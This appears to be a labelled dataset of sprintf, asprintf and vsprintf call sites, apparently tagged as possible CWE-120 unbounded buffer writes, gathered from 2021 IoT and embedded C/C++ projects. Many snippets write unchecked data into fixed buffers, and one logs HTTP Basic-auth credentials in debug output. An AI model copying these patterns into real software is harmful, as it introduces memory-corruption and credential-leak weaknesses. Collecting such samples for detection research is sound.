2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&sql, ""SELECT * FROM ""TO_STRING(TABLE_NAME)"" WHERE timestamp > %ld ORDER BY id ASC;"", ts);",120,1,"    char * sql;

    asprintf(&sql, ""SELECT * FROM ""TO_STRING(TABLE_NAME)"" WHERE timestamp > %ld ORDER BY id ASC;"", ts);
    
    int rc = sqlite3_exec(conn, sql, f, NULL, &errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Sensor query GT timestamp failed::%s"", time(NULL), errmsg);",120,1,"        fflush(stderr);

        asprintf(&send_buf, ""%ld Storage Manager: Sensor query GT timestamp failed::%s"", time(NULL), errmsg);

        sqlite3_free(errmsg);
"
2021\HVAC-Monitoring-System\sensor_db.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_db.c,"asprintf(&send_buf, ""%ld Storage Manager: Sensor query GT timestamp complete"", time(NULL));",120,1,"    } else
    {
        asprintf(&send_buf, ""%ld Storage Manager: Sensor query GT timestamp complete"", time(NULL));
    }

"
2021\HVAC-Monitoring-System\sensor_node.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_node.c,"asprintf(&name, LOG_FILE);                                      \",120,1,"    int j = 0;                                                      \
    char * name;                                                    \
    asprintf(&name, LOG_FILE);                                      \
    do { 							                                \
        fp_log = fopen(name, ""wx"");				                    \
"
2021\HVAC-Monitoring-System\sensor_node.c,Dataset Download,../../Dataset Download/2021\HVAC-Monitoring-System\sensor_node.c,"asprintf(&name, LOG_FILE""(%d)"", ++j);                   \",120,1,"        if((fp_log) == NULL) { 					                    \
            free(name);                                             \
            asprintf(&name, LOG_FILE""(%d)"", ++j);                   \
        } else break;                                               \
    } while(j < MAX_LOGS);                                                \
"
2021\intelli-switch\stm32\MDK-ARM\bmp280.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\bmp280.c,"sprintf(buffer,""TEMP:%.2f 'C "",bmp_280_temperature);",120,1,"						//ӡϢ
	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,""TEMP:%.2f 'C "",bmp_280_temperature);
	if(!AppMode)
		l_print(buffer,2,Left);
"
2021\intelli-switch\stm32\MDK-ARM\bmp280.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\bmp280.c,"sprintf(buffer,""QNH :%.2fhPa"",bmp_280_atmospressure/100);",120,1,"	//ӡϢ
	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,""QNH :%.2fhPa"",bmp_280_atmospressure/100);
	if(!AppMode)
		l_print(buffer,3,Left);
"
2021\intelli-switch\stm32\MDK-ARM\DHT11.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\DHT11.c,"sprintf(buffer,""HUMI:%hhu per"",DHT11_HUMIDITY);",120,1,"	char buffer[14];
	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,""HUMI:%hhu per"",DHT11_HUMIDITY);
	if(!AppMode)
		l_print(buffer,5,Left);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(AT_CWJAP,""AT+CWJAP=\""%s\"",\""%s\"""",SSID,PASSWORD);",120,1,"	char AT_CWJAP[64];
	memset(AT_CWJAP,0,sizeof(AT_CWJAP));
	sprintf(AT_CWJAP,""AT+CWJAP=\""%s\"",\""%s\"""",SSID,PASSWORD);
	ESP_SendAT(AT_CWJAP);
	ESP_SYNC_RECEIVE(ESP_WIFI_CONN_TIMEOUT_MS);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(AT_CWJAP,""AT+CWSAP=\""%s\"",\""%s\"",11,3"",SSID,PASSWORD);",120,1,"	char AT_CWJAP[64];
	memset(AT_CWJAP,0,sizeof(AT_CWJAP));
	sprintf(AT_CWJAP,""AT+CWSAP=\""%s\"",\""%s\"",11,3"",SSID,PASSWORD);
	ESP_SendAT(AT_CWJAP);
	ESP_SYNC_RECEIVE(ESP_WIFI_CONN_TIMEOUT_MS);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(cmd,""AT+CIPSEND=%hhu,%hu"",clientID,len);",120,1,"	char cmd[20];uint16_t TIMEOUT_CNT=ESP_SERVER_TRANSMIT_STANDBY_TIMEOUT_MS;
	memset(cmd,0,sizeof(0));
	sprintf(cmd,""AT+CIPSEND=%hhu,%hu"",clientID,len);
	ESP_SERVER_TRANSMIT_AVAILABLE=0;
	ESP_SendAT(cmd);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(AT_CIPSTART,""AT+CIPSTART=\""TCP\"",\""%s\"",%s"",ip,port);",120,1,"	char AT_CIPSTART[80];
	memset(AT_CIPSTART,0,sizeof(AT_CIPSTART));
	sprintf(AT_CIPSTART,""AT+CIPSTART=\""TCP\"",\""%s\"",%s"",ip,port);
	ESP_SendAT(AT_CIPSTART);
	ESP_SYNC_RECEIVE(5000);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(AT_CIPSERVER,""AT+CIPSERVER=1,%s"",port);",120,1,"	char AT_CIPSERVER[30];
	memset(AT_CIPSERVER,0,sizeof(AT_CIPSERVER));
	sprintf(AT_CIPSERVER,""AT+CIPSERVER=1,%s"",port);
	ESP_SendAT(AT_CIPSERVER);
	ESP_SYNC_RECEIVE(1000);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(error,""The URL ('%s') you request for is not found.Please Check the Route Table configured in the Firmware."",URL);",120,1,"	memset(error,0,sizeof(error));
	memset(content_length,0,sizeof(content_length));
	sprintf(error,""The URL ('%s') you request for is not found.Please Check the Route Table configured in the Firmware."",URL);
	content_len=strlen(ESP_SERVER_HTTP_ERRPAGE_404_1)+strlen(error)+strlen(ESP_SERVER_HTTP_ERRPAGE_404_2);
	sprintf(content_length,""Content-Length: %hu\r\n\r\n"",content_len);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(content_length,""Content-Length: %hu\r\n\r\n"",content_len);",120,1,"	sprintf(error,""The URL ('%s') you request for is not found.Please Check the Route Table configured in the Firmware."",URL);
	content_len=strlen(ESP_SERVER_HTTP_ERRPAGE_404_1)+strlen(error)+strlen(ESP_SERVER_HTTP_ERRPAGE_404_2);
	sprintf(content_length,""Content-Length: %hu\r\n\r\n"",content_len);
	//ESP_SERVER_HTTP_RESPONSE_HEAD
	ESP_CMD_SendToClient(clientID,ESP_SERVER_HTTP_RESPONSE_HEAD);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(temp,""%s %s %s %s"",ESP_SSID,ESP_PASSWD,ESP_TCP_IPADDR,ESP_TCP_PORT);",120,1,"	if(ESP_SSID[0]>='0'&&ESP_SSID[0]<='z')
	{
		sprintf(temp,""%s %s %s %s"",ESP_SSID,ESP_PASSWD,ESP_TCP_IPADDR,ESP_TCP_PORT);
	}
	else
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"sprintf(temp,""Invalid Invalid 0.0.0.0 0"");",120,1,"	else
	{
		sprintf(temp,""Invalid Invalid 0.0.0.0 0"");
	}
	ESP_SERVER_HTTP_STATICPAGE(clientID,temp);
"
2021\intelli-switch\stm32\MDK-ARM\illuminanceMeas.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\illuminanceMeas.c,"sprintf(buffer,""ILLU:%.1f lx"",illuminance);",120,1,"	//ӡϢ
	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,""ILLU:%.1f lx"",illuminance);
	if(!AppMode)
		l_print(buffer,4,Left);
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"sprintf((char*)databuff,""$%.2f:%hhu:%.2f:%.1f#"",bmp_280_temperature,DHT11_HUMIDITY,bmp_280_atmospressure,illuminance);",120,1,"{
	memset(databuff,0,sizeof(databuff));
	sprintf((char*)databuff,""$%.2f:%hhu:%.2f:%.1f#"",bmp_280_temperature,DHT11_HUMIDITY,bmp_280_atmospressure,illuminance);
	
}
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"sprintf(timebuff,""%s %02hhu:%02hhu:%02hhu"",week,hour,minute,second);",120,1,"	
	memset(timebuff,0,sizeof(timebuff));
	sprintf(timebuff,""%s %02hhu:%02hhu:%02hhu"",week,hour,minute,second);
	l_print(timebuff,1,Middle);
	ESP8266_WatchDog();
"
2021\iot2020-2021\sekkyone\main.c,Dataset Download,../../Dataset Download/2021\iot2020-2021\sekkyone\main.c,"sprintf(json, ""{\""id\"": \""%s\"", \""temperature\"": \""%s\"", \""humidity\"": \""%s\"", \""levelFlame\"": \""%d\"", \""levelFill\"": \""%d\""}"",",120,1,"    static char json[128];

    sprintf(json, ""{\""id\"": \""%s\"", \""temperature\"": \""%s\"", \""humidity\"": \""%s\"", \""levelFlame\"": \""%d\"", \""levelFill\"": \""%d\""}"",
                  EMCUTE_ID, sensors->temp, sensors->hum, sensors->level_flame, sensors->level_fill);
    
"
2021\iot2020-2021\sekkyone\main.c,Dataset Download,../../Dataset Download/2021\iot2020-2021\sekkyone\main.c,"sprintf(fill_level,""%d"", (int)(100.0 * (1.0 * distance) / atoi(BUCKET_HEIGHT)));",120,1,"        
        hd44780_set_cursor(&dev_lcd,0,1);
        sprintf(fill_level,""%d"", (int)(100.0 * (1.0 * distance) / atoi(BUCKET_HEIGHT)));
        hd44780_print(&dev_lcd,""F: "");
        hd44780_print(&dev_lcd, fill_level);
"
2021\IoTea\iotea-camera\main\app_aws.c,Dataset Download,../../Dataset Download/2021\IoTea\iotea-camera\main\app_aws.c,"sprintf(topic_name, ""IoTea/%s/camera"", CONFIG_PLANT_NAME);",120,1,"
  char topic_name[100];
  sprintf(topic_name, ""IoTea/%s/camera"", CONFIG_PLANT_NAME);

  const char *TOPIC = (const char *)&topic_name;
"
2021\IoTea\iotea-camera\main\app_aws.c,Dataset Download,../../Dataset Download/2021\IoTea\iotea-camera\main\app_aws.c,"sprintf(topic_name, ""IoTea/%s/trigger"", CONFIG_PLANT_NAME);",120,1,"  // Subscribe to the trigger topic for PLANT_NAME
  char topic_name[100];
  sprintf(topic_name, ""IoTea/%s/trigger"", CONFIG_PLANT_NAME);

  const char *TOPIC = (const char *)&topic_name;
"
2021\IOT_Project_1\main.c,Dataset Download,../../Dataset Download/2021\IOT_Project_1\main.c,"sprintf(str, ""%u"", IP[i]);",120,1,"    for (i = 0; i < IP_ADD_LENGTH; i++)
    {
        sprintf(str, ""%u"", IP[i]);
        putsUart0(str);
        if (i < IP_ADD_LENGTH-1)
"
2021\IOT_Project_1\main.c,Dataset Download,../../Dataset Download/2021\IOT_Project_1\main.c,"sprintf(str, ""%02x"", MAC[i]);",120,1,"    for (i = 0; i < HW_ADD_LENGTH; i++)
    {
        sprintf(str, ""%02x"", MAC[i]);
        putsUart0(str);
        if (i < HW_ADD_LENGTH-1)
"
2021\IOT_Project_1\SYSTEM\uart0.c,Dataset Download,../../Dataset Download/2021\IOT_Project_1\SYSTEM\uart0.c,"sprintf(str, ""%u"", num);",120,1,"
        char str[10];
        sprintf(str, ""%u"", num);
        putsUart0(str);
        putcUart0('\n');
"
2021\Kiss-Light_Hub\src\daemon.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\daemon.c,"sprintf( str, ""%d\n"", getpid() );",120,1,"
        /* Get the current PID */
        sprintf( str, ""%d\n"", getpid() );

        /* Write PID to Lockfile */
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"sprintf( port_str, ""%d"", cfg->mqtt_port );",120,1,"     */
    char port_str[10];
    sprintf( port_str, ""%d"", cfg->mqtt_port );
    int sockfd_mqtt = open_nb_socket( cfg->mqtt_server, port_str );

"
2021\netifyd\src\nd-conntrack.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-conntrack.cpp,"sprintf(buffer,",120,1,"    char buffer[1024];

    sprintf(buffer,
        ""l3_proto: %hu, l4_proto: %hhu"",
        flow->l3_proto, flow->l4_proto);
"
2021\netifyd\src\nd-flow.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-flow.cpp,"for (int i = 0; i < 4; i++, p += 2) sprintf(p, ""%02hhx"", digest[i]);",120,1,"
    p += ND_FLOW_CAPTURE_SUB_OFFSET;
    for (int i = 0; i < 4; i++, p += 2) sprintf(p, ""%02hhx"", digest[i]);
    strcat(p, "".cap"");

"
2021\netifyd\src\nd-flow.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-flow.cpp,"sprintf(tohex, ""0x%04hx"", ssl.version);",120,1,"            char tohex[7];

            sprintf(tohex, ""0x%04hx"", ssl.version);
            j[""ssl""][""version""] = tohex;

"
2021\netifyd\src\nd-flow.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-flow.cpp,"sprintf(tohex, ""0x%04hx"", ssl.cipher_suite);",120,1,"            j[""ssl""][""version""] = tohex;

            sprintf(tohex, ""0x%04hx"", ssl.cipher_suite);
            j[""ssl""][""cipher_suite""] = tohex;

"
2021\netifyd\src\nd-util.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-util.cpp,"sprintf(p, ""%02x"", digest_bin[i]);",120,1,"
    for (int i = 0; i < SHA1_DIGEST_LENGTH; i++, p += 2)
        sprintf(p, ""%02x"", digest_bin[i]);

    digest_str.assign(_digest);
"
2021\netifyd\src\netifyd.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\netifyd.cpp,"sprintf(mac_dst, ""%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"",",120,1,"        char mac_dst[ND_STR_ETHALEN + 1];

        sprintf(mac_dst, ""%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"",
            mac_src[0], mac_src[1], mac_src[2],
            mac_src[3], mac_src[4], mac_src[5]);
"
2021\Powergy-Medusa-FW-Basic-Auth\lib\ArduinoJson\extras\tests\MsgPackSerializer\serializeObject.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\lib\ArduinoJson\extras\tests\MsgPackSerializer\serializeObject.cpp,"sprintf(key, ""i%X"", i);",120,1,"    for (int i = 0; i < 16; ++i) {
      char key[16];
      sprintf(key, ""i%X"", i);
      object[key] = i;
    }
"
2021\Powergy-Medusa-FW-Basic-Auth\lib\PZEM-004T-v30\PZEM004Tv30.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\lib\PZEM-004T-v30\PZEM004Tv30.cpp,"sprintf(temp, ""%.2x "", buffer[i]);",120,1,"    for(uint16_t i = 0; i < len; i++){
        char temp[6];
        sprintf(temp, ""%.2x "", buffer[i]);
        Serial.print(temp);

"
2021\Powergy-Medusa-FW-Basic-Auth\src\main.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\src\main.cpp,"sprintf(macStr, ""%02X%02X"", mac[4], mac[5]);",120,1,"  String ssidDeviceName;
  WiFi.macAddress(mac);
  sprintf(macStr, ""%02X%02X"", mac[4], mac[5]);
  ssidDeviceName = ssid1 + String(macStr);
  return  ssidDeviceName;  
"
2021\Powergy-Medusa-FW-Basic-Auth\src\main.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\src\main.cpp,"sprintf(macStr, ""%02X:%02X:%02X:%02X:%02X:%02X"", mac[0],  mac[1], mac[2], mac[3], mac[4], mac[5]);",120,1,"  char macStr[18] = {0};
  WiFi.macAddress(mac);
  sprintf(macStr, ""%02X:%02X:%02X:%02X:%02X:%02X"", mac[0],  mac[1], mac[2], mac[3], mac[4], mac[5]); 
  return  String(macStr);
}
"
2021\Simple_8266_Data_Logger\v27\ESPxWebFlMgr.cpp,Dataset Download,../../Dataset Download/2021\Simple_8266_Data_Logger\v27\ESPxWebFlMgr.cpp,"sprintf(chunkSize, ""%zx\r\n"", len);",120,1,"        const char * footer = ""\r\n"";
        char chunkSize[11];
        sprintf(chunkSize, ""%zx\r\n"", len);
        fileManager->client().write(chunkSize, strlen(chunkSize));

"
2021\smart-energy-meter\hardware_and_programming\V2_LCD_SENSOR_ESP8266_EEPROM_final\CODE\code.c,Dataset Download,../../Dataset Download/2021\smart-energy-meter\hardware_and_programming\V2_LCD_SENSOR_ESP8266_EEPROM_final\CODE\code.c,"sprintf(buffer,""%5d"",Pulse);",120,1,"
    LCDCommand(0x86);
    sprintf(buffer,""%5d"",Pulse);
    LCDPuts(buffer);
   
"
2021\smart-energy-meter\hardware_and_programming\V2_LCD_SENSOR_ESP8266_EEPROM_final\CODE\code.c,Dataset Download,../../Dataset Download/2021\smart-energy-meter\hardware_and_programming\V2_LCD_SENSOR_ESP8266_EEPROM_final\CODE\code.c,"sprintf(buffer,""%5d"",Unit);",120,1,"   
    LCDCommand(0xc6);
    sprintf(buffer,""%5d"",Unit);
	LCDPuts(buffer);

"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%c\t%u\t%u\t%u\r\n"", cStatus, ( unsigned int ) pxTaskStatusArray[ x ].uxCurrentPriority, ( unsigned int ) pxTaskStatusArray[ x ].usStackHighWaterMark, ( unsigned int ) pxTaskStatusArray[ x ].xTaskNumber ); */",120,1,"
				/* Write the rest of the string. */
				sprintf( pcWriteBuffer, ""\t%c\t%u\t%u\t%u\r\n"", cStatus, ( unsigned int ) pxTaskStatusArray[ x ].uxCurrentPriority, ( unsigned int ) pxTaskStatusArray[ x ].usStackHighWaterMark, ( unsigned int ) pxTaskStatusArray[ x ].xTaskNumber ); /*lint !e586 sprintf() allowed as this is compiled with many compilers and this is a utility function only - not part of the core kernel implementation. */
				pcWriteBuffer += strlen( pcWriteBuffer ); /*lint !e9016 Pointer arithmetic ok on char pointers especially as in this case where it best denotes the intent of the code. */
			}
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%lu\t\t%lu%%\r\n"", pxTaskStatusArray[ x ].ulRunTimeCounter, ulStatsAsPercentage );",120,1,"						#ifdef portLU_PRINTF_SPECIFIER_REQUIRED
						{
							sprintf( pcWriteBuffer, ""\t%lu\t\t%lu%%\r\n"", pxTaskStatusArray[ x ].ulRunTimeCounter, ulStatsAsPercentage );
						}
						#else
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%u\t\t%u%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter, ( unsigned int ) ulStatsAsPercentage ); */",120,1,"							/* sizeof( int ) == sizeof( long ) so a smaller
							printf() library can be used. */
							sprintf( pcWriteBuffer, ""\t%u\t\t%u%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter, ( unsigned int ) ulStatsAsPercentage ); /*lint !e586 sprintf() allowed as this is compiled with many compilers and this is a utility function only - not part of the core kernel implementation. */
						}
						#endif
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%lu\t\t<1%%\r\n"", pxTaskStatusArray[ x ].ulRunTimeCounter );",120,1,"						#ifdef portLU_PRINTF_SPECIFIER_REQUIRED
						{
							sprintf( pcWriteBuffer, ""\t%lu\t\t<1%%\r\n"", pxTaskStatusArray[ x ].ulRunTimeCounter );
						}
						#else
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"sprintf( pcWriteBuffer, ""\t%u\t\t<1%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter ); */",120,1,"							/* sizeof( int ) == sizeof( long ) so a smaller
							printf() library can be used. */
							sprintf( pcWriteBuffer, ""\t%u\t\t<1%%\r\n"", ( unsigned int ) pxTaskStatusArray[ x ].ulRunTimeCounter ); /*lint !e586 sprintf() allowed as this is compiled with many compilers and this is a utility function only - not part of the core kernel implementation. */
						}
						#endif
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_hard_table.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_hard_table.c,"sprintf(dp_str,""%d"",g_dev_info.dev_dp.app_relay_stat.dpid_num);",120,1,"
    UCHAR_T dp_str[10] = {0};
    sprintf(dp_str,""%d"",g_dev_info.dev_dp.app_relay_stat.dpid_num);
    ty_cJSON *js_power = ty_cJSON_GetObjectItem(root,dp_str);
    if (NULL == js_power)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_hard_table.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_hard_table.c,"sprintf(dp_str,""%d"",g_dev_info.dev_dp.switch_dp.dpid_num);",120,1,"
    UCHAR_T dp_str[10] = {0};
    sprintf(dp_str,""%d"",g_dev_info.dev_dp.switch_dp.dpid_num);
    ty_cJSON *js_channel = ty_cJSON_GetObjectItem(root,dp_str);
    if (NULL == js_channel)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"len = sprintf(buffer, ""%s\r\n"", fsd->vfs_dirent->name);",120,1,"            if (shortlist)
            {
                len = sprintf(buffer, ""%s\r\n"", fsd->vfs_dirent->name);
                if (sfifo_space(&fsd->fifo) < len)
                {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %02i:%02i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_hour, s_time->tm_min, fsd->vfs_dirent->name);",120,1,"                s_time = gmtime(&st.st_mtime);
                if (s_time->tm_year == current_year)
                    len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %02i:%02i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_hour, s_time->tm_min, fsd->vfs_dirent->name);
                else
                    len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %5i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_year + 1900, fsd->vfs_dirent->name);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %5i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_year + 1900, fsd->vfs_dirent->name);",120,1,"                    len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %02i:%02i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_hour, s_time->tm_min, fsd->vfs_dirent->name);
                else
                    len = sprintf(buffer, ""-rw-rw-rw-   1 user     ftp  %11ld %s %02i %5i %s\r\n"", st.st_size, month_table[s_time->tm_mon], s_time->tm_mday, s_time->tm_year + 1900, fsd->vfs_dirent->name);
                if (VFS_ISDIR(st.st_mode))
                    buffer[0] = 'd';
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\ftp\ftpd.c,"vsprintf(buffer, msg, arg);",120,1,"
    va_start(arg, msg);
    vsprintf(buffer, msg, arg);
    va_end(arg);
    strcat(buffer, ""\r\n"");
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\lite-log.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\lite-log.c,"LITE_sprintf((char *__restrict__)ascii + i % 16, ""%c"", ((buf[i] >= ' ' && buf[i] <= '~') ?  buf[i] : '.'));",120,1,"            written += 1;
        }
        LITE_sprintf((char *__restrict__)ascii + i % 16, ""%c"", ((buf[i] >= ' ' && buf[i] <= '~') ?  buf[i] : '.'));

        if (((i + 1) % 16 == 0) || (i == len - 1)) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_httpc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\http\utils_httpc.c,"sprintf(base64buff, ""%s:%s"", client->auth_user, client->auth_password);",120,1,"
    httpclient_get_info(client, send_buf, send_idx, ""Authorization: Basic "", 0);
    sprintf(base64buff, ""%s:%s"", client->auth_user, client->auth_password);
    log_debug(""bAuth: %s"", base64buff) ;
    httpclient_base64enc(b_auth, base64buff);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,"sprintf((char *)pkt, ""%lu"", TIMEOUT);",120,1,"        os_strcpy ((char *)pkt, ""timeout"");
        pkt += 7 /*strlen(""timeout"")*/ + 1;
        sprintf((char *)pkt, ""%lu"", TIMEOUT);
#ifdef ET_DEBUG
        TFTP_PRT(""send option \""timeout %s\""\n"", (char *)pkt);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\app\tftp\tftpclient.c,"pkt += sprintf((char *)pkt, ""blksize%c%d%c"",",120,1,"        pkt += os_strlen((char *)pkt) + 1;
        /* try for more effic. blk size */
        pkt += sprintf((char *)pkt, ""blksize%c%d%c"",
                       0, TftpBlkSizeOption, 0);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\plf\refip\src\bim\bim_uart.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\plf\refip\src\bim\bim_uart.c,"n=vsprintf(uart_buff, fmt, ap);",120,1,"	va_list ap;
    va_start(ap, fmt);
    n=vsprintf(uart_buff, fmt, ap);
    va_end(ap);
    uart_putchar(uart_buff);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\printf.c,"int __wrap_vasprintf(char **ret, const char *format, va_list ap)",120,1,"}

int __wrap_vasprintf(char **ret, const char *format, va_list ap)
{
	size_t size;
"
